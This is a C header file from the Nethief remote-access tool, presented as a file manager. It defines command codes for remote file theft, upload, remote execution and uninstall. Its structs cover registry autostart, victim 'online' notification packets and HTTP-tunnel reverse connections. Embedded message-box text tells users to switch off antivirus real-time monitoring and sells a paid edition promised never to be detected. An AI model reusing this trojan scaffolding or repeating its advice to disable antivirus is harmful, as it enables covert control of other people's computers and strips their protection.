//Download by http://www.NewXing.com
///////////////////////////////////////////////////////////////////////////////
//
// STRUCTURE_DEFINE.h  --  结构常量定义头文件
//
///////////////////////////////////////////////////////////////////////////////

#ifndef _INC_STRUCTURE_DEFINE
#define _INC_STRUCTURE_DEFINE

//*****************************************************************************
//TreeView树节点属性//////////////////////////////
#define TI_ROOT							0x00000001//根节点"文件管理器"
#define TI_HOST							0x00000002//主机节点(此节点是主机,包括"我的电脑"和远程主机)
#define TI_DISKDRIVE_REMOVABLE			0x00000004//软盘
#define TI_DISKDRIVE_FIXED				0x00000008//硬盘及其它
#define TI_DISKDRIVE_CDROM				0x00000010//光盘
#define TI_ONCEEXPAND					0x00000020//此节点曾经展开过
#define TI_DISKDRIVE					0x00000040//此节点是磁盘驱动器
#define TI_CUT							0x00000080//此节点被剪贴
#define TI_REMOTE						0x00000100//远程节点(此节点非本地)
#define TI_ONCEACCESS					0x00000200//曾经访问过(用于标识远程软驱和光驱)
//ListView列表项属性///////////////////////////////
#define LI_FOUND						0XFFFFFFFF//此列表项曾在Tree中被找到,就是说它不是新建的文件夹
//树映象列表的图标索引/////////////////////////////
#define ICO_FILEMANAGER							0x00000000//文件管理器
#define ICO_MYCOMPUTER							0x00000001//我的电脑
#define ICO_FOLDER								0x00000002//文件夹
#define ICO_FOLDER_OPEN							0x00000003//文件夹(打开状态)
#define ICO_REMOTEHOST							0x00000004//远程主机
#define ICO_REMOTEHOST_DISCONNECT				0x00000005//远程主机(断开连接状态)
#define ICO_REMOTEHOST_HTTPTUNNEL				0x00000006//远程HTTP隧道主机
#define ICO_REMOTEHOST_HTTPTUNNEL_DISCONNECT	0x00000007//远程HTTP隧道主机(断开连接状态)
#define ICO_DRIVE_REMOVABLE						0x00000008//软盘驱动器
#define ICO_DRIVE_FIXED							0x00000009//硬盘驱动器
#define ICO_DRIVE_CDROM							0x0000000A//光盘驱动器
#define ICO_DRIVE_ZIP							0x0000000B//ZIP驱动器
#define ICO_DRIVE_REMOTE						0x0000000C//网络驱动器
//自定义消息///////////////////////////////////////
#define WM_SYSTRAY						WM_USER+100
#define WM_SOCKET						WM_USER+101
#define WM_WORKTHREAD					WM_USER+102
//工作线程WPARAM值(用于区分是哪种任务完成)也是命令值////
#define CMD_NOTIFYCONNECT				0x00000001
#define CMD_IDVERIFY					0x00000002
#define CMD_DOWNLOADDISKDRIVEINFO		0x00000003
#define CMD_EXPANDDIRECTORY				0x00000004
#define CMD_SHOWFILELIST				0x00000005
#define CMD_RENAMEFILE					0x00000006
#define CMD_NEWFILE						0x00000007
#define CMD_NEWFOLDER					0x00000008
#define CMD_DELETEFILE					0x00000009
#define CMD_REMOTEPASTE					0x00000010
#define CMD_GETOPERATIONOBJECT			0x00000011
#define CMD_DOWNLOADFILE				0x00000012
#define CMD_UPLOADFILE					0x00000013
#define CMD_SHOWPROPERTY_MULTI			0x00000014
#define CMD_SHOWPROPERTY_SINGLE			0x00000015
#define CMD_MODIFYPROPERTY_SINGLE		0x00000016
#define CMD_SHOWPROPERTY_DISKDRIVE		0x00000017
#define CMD_MODIFYPROPERTY_DISKDRIVE	0x00000018
#define CMD_REMOTERUN					0x00000019
#define CMD_REMOTEUNINSTALL				0x00000020
#define CMD_FINDFILE					0x00000021
#define CMD_SHOWNOTE					0x00000022
#define CMD_GETFILEINFO					0x00000023

#define OTR_REFRESHSTATUSBAR			0x00001001
//其它常量定义////////////////////////////////////
#define PROGRESS_RANGE					1000


//*****************************************************************************
#define PUBLICPASSWORD		"L*A|}t~k"			//用于加密密钥的密钥
//免费版说明消息框的内容////////////////////////////
#define MESSAGEBOX_CAPTION	"写在前面的话"
#define MESSAGEBOX_TEXT		"\
    一直以来，我们都秉承着免费的精神，为大家提供各种软件。但不知出于\
何种原因，这些程序总是遭到杀毒软件的追杀，被冠以病毒之名。这给很多软件的忠实用户带来了不少\
的麻烦，运行软件时会被杀毒软件杀掉而无法使用。\r\n\r\n    为此，我们特别推出了不会被杀毒软\
件查杀的个人版软件。个人版软件除了不会被杀毒软件查杀外，其它都与免费版软件一样。也就是说免\
费版软件只是会被杀毒软件查杀，并没有任何功能限制。\r\n\r\n    我们承诺个人版软件用户可享受\
如下售后服务：\r\n1、如被查杀，免费更换：保证您的个人版软件始终不会被查杀。\r\n2、终生免费\
升级到当前最新版本的个人版：保证您始终使用本软件的最新版本。\r\n\r\n    如果您现在使用的软\
件是从网上免费下载的，没有向我们支付任何费用，那么它是免费版软件，很可能会被杀毒软件查杀。\
您在下载使用本软件时，如果杀毒软件报毒属正常现象，只要关闭病毒实时监控就可以了，本软件内绝\
不含病毒、后门！ 请您放心使用。\r\n\r\n    如果您想购买个人版软件，请查询软件里的 Sale.txt\
 或我们的网站 www.greenstuffsoft.net ！"

#define FILENOTFOUND_CAPTION	"生成服务端程序"
#define FILENOTFOUND_TEXT		"\
无法找到文件 Server.bud，此文件可能已经被杀毒软件删除了。请在下载使用本软件时关闭杀毒软件！\
\r\n\r\n    一直以来，我们都秉承着免费的精神，为大家提供各种软件。但不知出于\
何种原因，这些程序总是遭到杀毒软件的追杀，被冠以病毒之名。这给很多软件的忠实用户带来了不少\
的麻烦，运行软件时会被杀毒软件杀掉而无法使用。\r\n\r\n    为此，我们特别推出了不会被杀毒软\
件查杀的个人版软件。个人版软件除了不会被杀毒软件查杀外，其它都与免费版软件一样。也就是说免\
费版软件只是会被杀毒软件查杀，并没有任何功能限制。\r\n\r\n    我们承诺个人版软件用户可享受\
如下售后服务：\r\n1、如被查杀，免费更换：保证您的个人版软件始终不会被查杀。\r\n2、终生免费\
升级到当前最新版本的个人版：保证您始终使用本软件的最新版本。\r\n\r\n    如果您现在使用的软\
件是从网上免费下载的，没有向我们支付任何费用，那么它是免费版软件，很可能会被杀毒软件查杀。\
您在下载使用本软件时，如果杀毒软件报毒属正常现象，只要关闭病毒实时监控就可以了，本软件内绝\
不含病毒、后门！ 请您放心使用。\r\n\r\n    如果您想购买个人版软件，请查询软件里的 Sale.txt\
 或我们的网站 www.greenstuffsoft.net ！"

//*****************************************************************************
//客户端与服务端都要用到的结构定义/////////////////
#pragma pack(1)

typedef struct		//服务端配置信息
{
	char cHttpDirName[100];			//存放数据文件的位置
	char cNotifyFilename[50];
	char cConnectFilename[50];
	char cDownloadFilename[50];
	char cKeyName[25];				//注册表自启动项键名
	char cFilename[25];				//服务端程序的文件名
	char cNote[25];					//服务端注释
	BYTE byCheckSum[16];			//MD5校验和
	char cDataPassword[50];			//数据加密密钥
}
SERVER_CONFIG,*pSERVER_CONFIG;

typedef struct			//发上线通报的UDP数据包
{
	BYTE byCheckSum[16];
	char cHostName[15];
	char cIPAddress[4];
	long lTotalMinutes;
}
SERVER_INFO,*pSERVER_INFO;

typedef struct		//客户端上传到主页空间的数据，用于告诉服务端开始连接
{
	char cClientName[15];
	char cIPAddress[4];
}
CLIENT_CONNECT_INFO,*pCLIENT_CONNECT_INFO;

typedef struct
{
	BYTE byCheckSum[16];		//下载文件的MD5校验和
	char cDownloadFileURL[100];	//下载文件的URL
}
DOWNLOAD_FILE_INFO,*pDOWNLOAD_FILE_INFO;
/////////////////////////////////////////////
typedef struct		//身份验证信息
{
	char cSoftwareName[14];	//软件的名字,应该为:Nethief_Server
	char cHostName[15];		//服务端的主机名
}
RECV_IDVERIFY_INFO,*pRECV_IDVERIFY_INFO;

typedef struct		//驱动器信息
{
	DWORD	dwType;			//驱动器类型
	char	cVolumeName[256];	//卷标名称
}
RECV_DISKDRIVE_INFO,*pRECV_DISKDRIVE_INFO;

typedef struct
{
	int		nFileCount;
	int		nFolderCount;
	DWORD	dwTotalSize;
}
RECV_PROPERTYMULTI_INFO,*pRECV_PROPERTYMULTI_INFO;

typedef struct
{
	CTime	m_ctime;
	CTime	m_mtime;
	CTime	m_atime;
	LONG	m_size;
	BYTE	m_attribute;
	DWORD	dwFileType;
}
RECV_PROPERTYSINGLE_INFO,*pRECV_PROPERTYSINGLE_INFO;

typedef struct
{
	char		cVolumeName[11];
	DWORD		dwSerialNumber;
	DWORDLONG	dwlTotalNumberOfBytes;
	DWORDLONG	dwlTotalNumberOfUnusedBytes;
}
RECV_PROPERTYDISKDRIVE_INFO,*pRECV_PROPERTYDISKDRIVE_INFO;

typedef struct
{
	BOOL	bIsFileExist;
	LONG	m_size;
	CTime	m_mtime;
}
RECV_GETFILEINFO_INFO,*pRECV_GETFILEINFO_INFO;

typedef struct
{
	int		bmType;
	int		bmWidth;
	int		bmHeight;
	int		bmWidthBytes;
	BYTE	bmPlanes;
	BYTE	bmBitsPixel;
	DWORD	dwBitsCount;
}
RECV_BITMAP_INFO,*pRECV_BITMAP_INFO;

#pragma pack()
//*****************************************************************************

#endif	//_INC_STRUCTURE_DEFINE